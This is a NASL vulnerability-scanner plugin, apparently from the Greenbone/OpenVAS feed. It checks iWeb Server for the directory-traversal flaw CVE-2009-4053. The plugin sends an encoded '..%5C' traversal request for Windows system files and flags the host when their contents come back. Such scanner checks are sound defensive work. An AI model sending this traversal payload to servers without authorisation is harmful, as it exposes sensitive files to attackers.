if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100378" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2009-12-08 12:57:07 +0100 (Tue, 08 Dec 2009)" );
	script_bugtraq_id( 37228 );
	script_cve_id( "CVE-2009-4053" );
	script_tag( name: "cvss_base", value: "4.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:S/C:N/I:P/A:N" );
	script_name( "iWeb Server URL Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/37228" );
	script_xref( name: "URL", value: "http://www.ashleybrown.co.uk/iweb/" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web Servers" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "iWeb/banner" );
	script_tag( name: "summary", value: "iWeb Server is prone to a directory-traversal vulnerability because
  the application fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "Exploiting this issue allows an attacker to access files outside of
  the web servers root directory. Successfully exploiting this issue
  will allow attackers to gain access to sensitive information." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!banner){
	exit( 0 );
}
if(egrep( pattern: "Server: iWeb", string: banner )){
	files = traversal_files( "windows" );
	for pattern in keys( files ) {
		file = files[pattern];
		url = NASLString( "/..%5C..%5C..%5C", file );
		req = http_get( item: url, port: port );
		res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
		if(!res){
			continue;
		}
		if(egrep( pattern: pattern, string: res, icase: TRUE )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 0 );

